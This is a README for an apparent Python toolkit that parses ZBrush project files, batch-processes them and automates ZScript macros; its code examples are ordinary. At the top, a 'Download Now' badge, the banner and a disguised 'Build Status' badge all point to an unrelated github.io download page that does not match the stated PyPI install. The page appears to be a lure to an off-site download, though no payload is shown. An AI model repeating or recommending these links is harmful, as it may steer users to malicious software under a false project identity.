# zbrush-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://Jemy978.github.io/zbrush-info-pn4/)


[![Banner](banner.png)](https://Jemy978.github.io/zbrush-info-pn4/)


[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://python.org)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PyPI version](https://img.shields.io/badge/pypi-v0.4.2-orange.svg)](https://pypi.org/project/zbrush-toolkit/)
[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](https://Jemy978.github.io/zbrush-info-pn4/)
[![Code Style](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

A Python toolkit for automating ZBrush workflows on Windows, processing `.ZPR` and `.ZTL` project files, and extracting mesh and layer data for pipeline integration.

ZBrush remains one of the most powerful digital sculpting applications used across game development, VFX, and product design. This toolkit bridges ZBrush's Windows environment with Python-based pipelines — allowing studios and individual artists to automate repetitive tasks, analyze project structure, and integrate sculpting data into broader asset workflows.

---

## Features

- **Project File Parsing** — Read and inspect `.ZPR` (ZBrush Project) and `.ZTL` (ZBrush Tool) file structures without opening ZBrush
- **Subtool Extraction** — Enumerate subtools, subdivision levels, and layer stacks from project files programmatically
- **Workflow Automation** — Trigger ZBrush operations via its scripting interface (`ZScript`) using generated macro files
- **Mesh Data Analysis** — Extract polygon counts, UV set presence, and vertex color data for QA and reporting
- **Batch Processing** — Process entire directories of ZBrush project files in a single pass
- **Metadata Export** — Export structured subtool and layer metadata to JSON or CSV for pipeline consumption
- **Windows Process Integration** — Launch, monitor, and gracefully close ZBrush processes from Python
- **Logging & Reporting** — Generate detailed scan reports suitable for asset management systems

---

## Requirements

| Requirement | Version | Notes |
|---|---|---|
| Python | 3.8 or higher | Tested on 3.8, 3.10, 3.12 |
| Operating System | Windows 10 / 11 | ZBrush is a Windows-native application |
| ZBrush | 2023 or higher | Required for live automation features |
| `construct` | ≥ 2.10 | Binary file parsing |
| `click` | ≥ 8.0 | CLI interface |
| `rich` | ≥ 13.0 | Terminal output formatting |
| `pandas` | ≥ 2.0 | Optional, for tabular data export |

---

## Installation

**Install from PyPI:**

```bash
pip install zbrush-toolkit
```

**Install from source:**

```bash
git clone https://github.com/yourorg/zbrush-toolkit.git
cd zbrush-toolkit
pip install -e ".[dev]"
```

**Verify installation:**

```bash
zbrush-toolkit --version
# zbrush-toolkit v0.4.2
```

---

## Quick Start

```python
from zbrush_toolkit import ZBrushProject

# Load a ZBrush project file
project = ZBrushProject.from_file("character_hero.ZPR")

# Print a summary of all subtools
for subtool in project.subtools:
    print(f"{subtool.name:30s} | polys: {subtool.polygon_count:>10,} | subdivs: {subtool.subdivision_levels}")

# Output:
# Body_Mesh                      | polys:    4,194,304 | subdivs: 6
# Head_HighRes                   | polys:    2,097,152 | subdivs: 5
# EyeSocket_Detail               | polys:      262,144 | subdivs: 4
```

---

## Usage Examples

### 1. Extracting Subtool Metadata to JSON

```python
import json
from zbrush_toolkit import ZBrushProject

project = ZBrushProject.from_file("creature_v3.ZPR")

metadata = project.export_metadata()

with open("creature_v3_report.json", "w") as f:
    json.dump(metadata, f, indent=2)

# creature_v3_report.json
# {
#   "project_name": "creature_v3",
#   "zbrush_version": "2024.0.1",
#   "subtool_count": 14,
#   "subtools": [
#     {
#       "name": "Body_Base",
#       "polygon_count": 1048576,
#       "subdivision_levels": 5,
#       "has_uvs": true,
#       "has_polypaint": true,
#       "layers": ["Details_A", "Skin_Wrinkles", "Scar_Pass"]
#     },
#     ...
#   ]
# }
```

---

### 2. Batch Processing a Project Directory

```python
from pathlib import Path
from zbrush_toolkit import ZBrushProject
from zbrush_toolkit.reports import BatchReport

project_dir = Path("D:/Assets/Characters/ZBrush_Projects")

report = BatchReport()

for zpr_file in project_dir.glob("**/*.ZPR"):
    try:
        project = ZBrushProject.from_file(zpr_file)
        report.add(project)
        print(f"[OK]  {zpr_file.name} — {len(project.subtools)} subtools")
    except Exception as exc:
        print(f"[ERR] {zpr_file.name} — {exc}")

# Export a CSV summary of all processed projects
report.to_csv("batch_scan_results.csv")
print(f"\nProcessed {report.total} files. Errors: {report.error_count}")
```

---

### 3. Automating ZBrush via ZScript Macros

```python
from zbrush_toolkit.automation import ZScriptBuilder, ZBrushProcess

# Build a ZScript macro that exports all subtools as OBJ
script = ZScriptBuilder()
script.export_all_subtools(
    output_dir="D:/exports/objs",
    format="OBJ",
    merge_subtools=False
)

macro_path = script.save("export_subtools.txt")

# Launch ZBrush on Windows, load a project, and run the macro
with ZBrushProcess() as zbrush:
    zbrush.open_project("character_hero.ZPR")
    zbrush.run_macro(macro_path)
    zbrush.wait_for_idle(timeout=120)

print("Export complete.")
```

---

### 4. Polygon Count QA Check

```python
from zbrush_toolkit import ZBrushProject
from zbrush_toolkit.qa import PolyCountThreshold

LIMITS = PolyCountThreshold(
    warn_above=2_000_000,
    fail_above=8_000_000
)

project = ZBrushProject.from_file("environment_rock_cluster.ZPR")

for subtool in project.subtools:
    status = LIMITS.check(subtool.polygon_count)
    print(f"{subtool.name:30s} | {subtool.polygon_count:>10,} polys | {status}")

# Environment_Rock_A             |    512,000 polys | OK
# Environment_Rock_B             |  2,340,000 polys | WARN
# Moss_Overlay                   |  9,100,000 polys | FAIL
```

---

### 5. CLI Usage

```bash
# Inspect a single project file
zbrush-toolkit inspect character_hero.ZPR

# Batch scan a directory and output CSV
zbrush-toolkit batch-scan ./projects/ --output report.csv

# Export subtool metadata as JSON
zbrush-toolkit export-meta creature_v3.ZPR --format json

# Check polygon counts against thresholds
zbrush-toolkit qa-polys ./projects/ --warn 2000000 --fail 8000000
```

---

## Project Structure

```
zbrush-toolkit/
├── zbrush_toolkit/
│   ├── __init__.py
│   ├── project.py          # ZBrushProject core class
│   ├── subtool.py          # Subtool and layer data models
│   ├── automation.py       # ZScriptBuilder and ZBrushProcess
│   ├── reports.py          # BatchReport and export utilities
│   ├── qa.py               # QA threshold checks
│   └── cli.py              # Click-based CLI entry point
├── tests/
│   ├── fixtures/           # Sample .ZPR files for testing
│   └── test_project.py
├── pyproject.toml
└── README.md
```

---

## Contributing

Contributions are welcome. Please follow these steps:

1. Fork the repository and create a feature branch (`git checkout -b feature/your-feature`)
2. Write tests for any new functionality under `tests/`
3. Ensure all tests pass: `pytest tests/ -v`
4. Run the linter: `black . && ruff check .`
5. Open a pull request with a clear description of the change

For significant changes, open an issue first to discuss the proposed approach.

---

## License

This project is licensed under the **MIT License**. See [`LICENSE`](LICENSE) for full details.

This toolkit is an independent open-source project and is not affiliated with or endorsed by Maxon Computer GmbH, the developer of ZBrush.